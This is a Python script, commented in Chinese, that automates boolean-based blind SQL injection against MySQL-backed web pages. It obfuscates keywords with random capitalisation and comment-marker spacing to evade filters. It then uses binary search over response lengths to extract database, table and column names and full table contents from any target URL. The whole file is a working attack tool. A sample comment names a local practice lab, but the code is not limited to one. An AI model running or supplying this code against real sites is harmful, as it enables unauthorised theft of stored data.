#!/usr/bin/env python
# encoding = utf-8

import requests
import sys
import random
import json
import prettytable

if len(sys.argv) != 4:
    print("Usage : python " + sys.argv[0] + " [payload]" + " [baseUrl] [currentQuery]")
    print("Example : python " + sys.argv[0] + "0\"or()or\"=\"1" + "http://www.xxx.com/index.php?id= 1")
    exit(1)

# hack-config-start
payload = sys.argv[1] # 样例 : 0"or()or"="1 或    0' or()or '='1 用空括号把产生Bool值的地方包裹起来
url = sys.argv[2]
current = sys.argv[3]
# 如果对参数进行了过滤 , 需要配置temper函数 , 双写或者加注释绕过
# hack-config-end

# global-start
contentLength = 0
inject_counter = 0
databases = {}
try:
    f = open("databases.json","r",encoding='utf-8')
    databases = json.load(f)
    f.close()
except:
    print("警告：数据库缓存打开失败！")
# global-end

# config-start
sleep_time = 5
error_time = 1
# config-end



# define-start
system_schema_names = ['information_schema','test','mysql','performance_schema','phpmyadmin', 'sys']
# 关键字
random_up_low_keywords = ['select','union','from','limit']
# 函数名
random_up_low_keywords.append('ascii')
random_up_low_keywords.append('substring')
# 系统库名/表名/列名
random_up_low_keywords.append('information_schema')
random_up_low_keywords.append('schemata')
random_up_low_keywords.append('tables')
random_up_low_keywords.append('columns')
random_up_low_keywords.append('schema_name')
random_up_low_keywords.append('table_name')
random_up_low_keywords.append('column_name')
# define-end

# TODO-start
# 优化显示
# TODO-end

# url混淆
def temper(tempPayload):
    global random_up_low_keywords
    for tempKeyword in random_up_low_keywords:
        tempPayload = tempPayload.replace(tempKeyword,getRandomType(tempKeyword))
    tempPayload = tempPayload.replace(" ","/**/")
    tempPayload = tempPayload.replace(" ","%a0")
    # tempPayload = tempPayload.replace("or","oorr")
    # tempPayload = tempPayload.replace("and","anandd")
    return tempPayload

def getRandomType(keywords):
    # TODO 返回随机大小写
    random_int = random.randint(0, len(keywords) - 1)
    tempList = list(keywords)
    tempList[random_int] = tempList[random_int].upper()
    return "".join(tempList)

# payload组装
def getPayload(database_name, table_name, column_name, where, indexOfResult, indexOfChar, mid):
    global payload
    # http://127.0.0.1/Less-65/index.php?id=0"or()or"="1
    startStr = payload.split("()")[0]
    endStr = payload.split("()")[1]
    # 混淆语句示例:((asCIi(sUBString((sELEct/**/scheMA_Name/**/FRom/**/inforMATion_scheMa.schemaTa/**//**/liMit/**/0,1),1,1)))>0)
    temppayload = "((ascii(substring((select " + column_name + " from " + database_name + "." + table_name + " " + where + " limit " + indexOfResult + ",1)," + indexOfChar + ",1)))>" + mid + ")"
    # temppayload = startStr + temppayload + endStr
    # temper
    temppayload = temper(temppayload)
    return temppayload

# 检测字符正确性
def exce(database_name, table_name, column_name, where, indexOfResult, indexOfChar, mid):
    global url
    global payload
    global current
    # judge-start
    if checkTrueOrFalse(payload, url, current, getPayload(database_name, table_name, column_name, where, indexOfResult, indexOfChar, mid)):
        return True
    else:
        return False
    # judge-end

# 获取返回页面长度
def getContentLength(url):
    return len(requests.get(url).text)

# 检查返回页面是否报错
def checkTrueOrFalse(payload, url, current, wrong):
    global contentLength
    startTemp = payload.split("()")[0]
    endTemp = payload.split("()")[1]
    payload1 = startTemp + "(" + wrong + ")" + endTemp
    testUrl1 = url + payload1
    payload2 = startTemp + "(" + current + ")" + endTemp
    testUrl2 = url + payload2
    content1 = requests.get(testUrl1).text
    content1 = content1.replace(payload1,wrong)
    len1 = len(content1)
    content2 = requests.get(testUrl2).text
    content2 = content2.replace(payload2,current)
    len2 = len(content2)
    if ((len1 != contentLength) and (len2 == contentLength)):
        return False
    else:
        return True

# 折半查找求字符
def doubleSearch(database_name, table_name, column_name, where, indexOfResult,indexOfChar,left_number, right_number):
    while left_number < right_number:
        mid = int((left_number + right_number) / 2)
        if exce(database_name, table_name, column_name, where, str(indexOfResult),str(indexOfChar + 1),str(mid)):
            left_number = mid
        else:
            right_number = mid
        if left_number == right_number - 1:
            if exce(database_name, table_name, column_name, where, str(indexOfResult),str(indexOfChar + 1),str(mid)):
                mid += 1
                break
            else:
                break
    return chr(mid)

# 注入函数
def getAllData(database_name, table_name, column_name, where):
    allData = []
    for i in range(32): # 需要遍历的查询结果的数量
        counter = 0
        data = ""
        for j in range(32): # 结果的长度
            counter += 1
            temp = doubleSearch(database_name, table_name, column_name, where, i, j, 0, 128) # 从255开始查询
            if ord(temp) == 1: # 当为1的时候说明已经查询结束
                break
            # sys.stdout.write(temp)
            # sys.stdout.flush()
            data += temp
            global inject_counter
            inject_counter += 1
            load = ["/","——","\\","——"]
            print('\r'+'已获取：',inject_counter,"B数据",load[j%4],end="")
        if counter == 1: # 当结果集的所有行都被遍历后退出
            break
        # sys.stdout.write("\r\n")
        # sys.stdout.flush()
        allData.append(data)
    return allData

# 获取库名
def getAllSchemaNames():
    return getAllData(column_name="schema_name", table_name="schemata", database_name="information_schema", where="")

# 获取表名字
def getAllTableNames(schema_name):
    return getAllData(column_name="table_name", table_name="tables", database_name="information_schema",  where="where(table_schema='" + schema_name + "')")

# 获取列名
def getAllColumnNames(schema_name, table_name):
    return getAllData(column_name="column_name", table_name="columns", database_name="information_schema",  where="where(table_name='" + table_name + "' and table_schema='" + schema_name + "')")

# 获取某一列数据
def getColumnData(schema_name, table_name ,column_name):
    return getAllData(column_name=column_name, table_name=table_name, database_name=schema_name,where="")

# 查表
def getTable(schema_name, table_name):
    global databases
    column_names = []
    table = []
    if table_name in databases[schema_name]:
        column_names = list(databases[schema_name][table_name][0])
    else:
        column_names = getAllColumnNames(schema_name, table_name)
    table.append(column_names)
    columns = []
    for column_name in column_names:
        column = getColumnData(schema_name, table_name ,column_name)
        columns.append(column)
    for index in range(len(columns[0])):
        temp = []
        for c in range(len(columns)):
            temp.append(columns[c][index])
        table.append(temp)
    return table

# 查库
def getDatabase(schema_name):
    table_names = getAllTableNames(schema_name)
    database = {}
    for table_name in table_names:
        database[table_name] = getTable(schema_name,table_name)
    return database

# 将表打印到控制台
def showTable(schema_name, table_name):
    global  databases
    table = []
    if schema_name in databases:
        if table_name in databases[schema_name]:
                if len(databases[schema_name][table_name]) > 1:
                    table = databases[schema_name][table_name]
                else:
                    table = getTable(schema_name, table_name)
                    databases[schema_name][table_name] = table
                tb = prettytable.PrettyTable()
                tb.field_names = table[0]
                for line in table[1:]:
                    tb.add_row(line)
                print("\r当前数据库 : " + schema_name + "\t当前表名 : " + table_name)
                print(tb)
        else:
            print("请检查表名")
    else:
        print("请检查数据库名")

# 初始化函数
def hack():
    global databases;
    print("================================")
    print("正在获取所有数据库 ...")
    allSchemaNames = getAllSchemaNames()
    print("\r所有数据库名获取完毕 !")
    print("================================")
    print("正在获取所有数据库表名 ...")
    tempDic = {}
    allUserSchemaNames = []
    templs = []
    for schema_name in allSchemaNames:
        print("--------------------------------")
        print("当前数据库 : " + schema_name + "\t"),
        IS_SYSTEM_SCHEMA = False
        for system_schema_name in system_schema_names:
            if system_schema_name == schema_name:
                print("Mysql自带系统数据库 , 智能忽略 !")
                IS_SYSTEM_SCHEMA = True
                break
        if not IS_SYSTEM_SCHEMA:
            print("")
            allUserSchemaNames.append(schema_name)
            tempDic[schema_name] = getAllTableNames(schema_name)
            print("")
        databases[schema_name] = {}
    print("\r所有表名获取完毕!")
    print("================================")
    print("正在获取所有表列名 ...")
    for schema_name in allUserSchemaNames:
        print("--------------------------------")
        for table_name in tempDic[schema_name]:
            print("当前数据库 : " + schema_name + "\t当前表名 : " + table_name)
            templs = getAllColumnNames(schema_name, table_name)
            print("")
            databases[schema_name][table_name] = []
            databases[schema_name][table_name].append(templs)
    print("\r所有列名获取完毕!")
    print("================================")

# 初始化
contentLength = getContentLength(url + current)
hack()

# 开始注入
while(True):
    print("数据库：")
    for database_name in list(databases.keys()):
        print(database_name)
    schema_name = input("需要查找的库名(exit退出)：")
    for system_schema_name in system_schema_names:
        if system_schema_name == schema_name:
            print("Mysql自带系统数据库 , 智能忽略 !")
            schema_name = "continue"
    if (schema_name == "continue"): continue
    if(schema_name == "exit"): break
    print("数据库" + schema_name + "的表：")
    try:
        for table_name in list(databases[schema_name].keys()):
            print(table_name)
    except:
        print("查无此库")
        continue
    table_name = input("需要查找的表名：")
    showTable(schema_name, table_name)
try:
    f = open("databases.json","w",encoding='utf-8')
    json.dump(databases, f)
    f.close()
except:
    print("缓存失败！")